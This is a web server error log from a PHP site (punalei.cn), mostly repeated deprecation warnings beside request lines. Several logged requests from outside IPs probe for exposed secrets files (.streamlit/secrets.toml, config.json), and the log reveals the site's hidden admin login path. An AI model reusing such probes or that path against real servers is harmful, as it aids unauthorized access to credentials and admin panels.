[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:31:26+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:32:12+08:00 ] 176.65.149.253 GET 120.24.147.77/.streamlit/secrets.toml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:32:12+08:00 ] 176.65.149.253 GET 120.24.147.77/.streamlit/secrets.toml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:40:37+08:00 ] 87.121.84.76 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:44:15+08:00 ] 176.65.149.234 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:45:14+08:00 ] 152.32.151.39 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:45:38+08:00 ] 152.32.151.39 GET 120.24.147.77/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:45:38+08:00 ] 152.32.151.39 GET 120.24.147.77/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:45:41+08:00 ] 152.32.151.39 GET 120.24.147.77/config.json
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:45:41+08:00 ] 152.32.151.39 GET 120.24.147.77/config.json
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:53:17+08:00 ] 2.58.56.62 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:53:18+08:00 ] 2.58.56.62 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:53:19+08:00 ] 14.220.182.223 GET punalei.cn/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:53:19+08:00 ] 14.220.182.223 GET punalei.cn/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:53:19+08:00 ] 2.58.56.62 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:53:45+08:00 ] 121.41.232.8 GET punalei.cn/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:53:45+08:00 ] 121.41.232.8 GET punalei.cn/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:53:53+08:00 ] 36.150.60.24 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:53:57+08:00 ] 36.150.60.24 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:53:57+08:00 ] 36.150.60.24 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:54:16+08:00 ] 121.41.232.11 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:54:16+08:00 ] 140.205.85.26 HEAD punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:54:18+08:00 ] 124.239.12.191 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:57:23+08:00 ] 36.150.60.24 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:59:55+08:00 ] 36.150.60.24 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:07:20+08:00 ] 14.220.182.223 GET punalei.cn/XUWiyIODRS.php/index/login
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:07:20+08:00 ] 14.220.182.223 GET punalei.cn/index.php?s=/captcha
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:07:20+08:00 ] 14.220.182.223 GET punalei.cn/XUWiyIODRS.php/ajax/lang?callback=define&controllername=index&lang=zh-cn&v=1.0.13
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:07:33+08:00 ] 14.220.182.223 POST punalei.cn/XUWiyIODRS.php/index/login
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:07:33+08:00 ] 14.220.182.223 GET punalei.cn/XUWiyIODRS.php/index/index
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:07:33+08:00 ] 14.220.182.223 GET punalei.cn/XUWiyIODRS.php/dashboard?addtabs=1
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:07:34+08:00 ] 14.220.182.223 GET punalei.cn/XUWiyIODRS.php/ajax/lang?callback=define&controllername=dashboard&lang=zh-cn&v=1.0.13
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:07:36+08:00 ] 14.220.182.223 GET punalei.cn/XUWiyIODRS.php/ldcms/site_info?addtabs=1
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:07:36+08:00 ] 14.220.182.223 GET punalei.cn/XUWiyIODRS.php/ajax/lang?callback=define&controllername=ldcms.site_info&lang=zh-cn&v=1.0.13
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T14:08:39+08:00 ] 14.220.182.223 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:10:32+08:00 ] 14.220.182.223 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:19:10+08:00 ] 85.92.66.148 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:19:13+08:00 ] 85.92.66.148 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:19:18+08:00 ] 85.92.66.150 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:19:39+08:00 ] 85.92.66.150 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T14:20:30+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/punaleizixun.html
[ error ] [2]Undefined variable $content
[ error ] [2]Trying to access array offset on value of type null
---------------------------------------------------------------
[ 2026-03-18T14:20:30+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/qiyexinwen.html
[ error ] [2]Undefined variable $content
[ error ] [2]Trying to access array offset on value of type null
---------------------------------------------------------------
[ 2026-03-18T14:20:31+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/hangyedongtai.html
[ error ] [2]Undefined variable $content
[ error ] [2]Trying to access array offset on value of type null
---------------------------------------------------------------
[ 2026-03-18T14:20:32+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html
[ download ] NULL
---------------------------------------------------------------
[ 2026-03-18T14:20:32+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html
